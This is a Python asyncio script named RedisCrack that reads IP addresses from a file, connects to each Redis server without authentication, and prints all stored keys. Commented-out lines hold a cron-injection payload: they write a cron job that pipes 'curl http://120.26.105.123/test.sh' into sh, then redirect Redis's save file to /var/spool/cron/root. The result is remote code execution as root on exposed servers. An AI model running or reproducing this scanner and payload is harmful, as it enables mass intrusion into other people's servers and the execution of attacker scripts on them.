
# coding: utf-8
"""
Created by chuwt on 18/4/3.
"""
# os
import asyncio
# third
import aioredis
# self

loop = asyncio.get_event_loop()


class RedisCrack(object):
    def __init__(self):
        self.queue = asyncio.Queue()

    async def get_ips(self):
        with open('./ips.txt', 'r+') as f:
            while True:
                data = f.readline()
                if data:
                    await self.queue.put(data)
                else:
                    break

    async def connector(self):
        while True:
            if self.queue.empty():
                continue
            ip = await self.queue.get()
            ip = ip.split('\n')[0]
            try:
                redis = await aioredis.create_redis(
                    'redis://{}'.format(ip), loop=loop, timeout=5
                )
            except TimeoutError:
                print('error{}'.format(ip))
            keys = await redis.keys('*')
            print(keys)
            # await redis.set('1', "\n\n*/1 * * * * curl http://120.26.105.123/test.sh | sh\n\n")
            # await redis.config_set('dir', '/var/spool/cron/')
            # await redis.config_set('dbfilename', 'root')
            # await redis.save()
            redis.close()
            await redis.wait_closed()

    async def main(self):
        tasks = list()
        tasks.append(asyncio.ensure_future(self.get_ips()))
        tasks += [asyncio.ensure_future(self.connector()) for _ in range(10)]
        await asyncio.wait(tasks)

    def run(self):
        try:
            loop.run_until_complete(asyncio.ensure_future(self.main()))
        except Exception as msg:
            print(msg)
        finally:
            loop.close()


if __name__ == '__main__':
    redis_crack = RedisCrack()
    redis_crack.run()
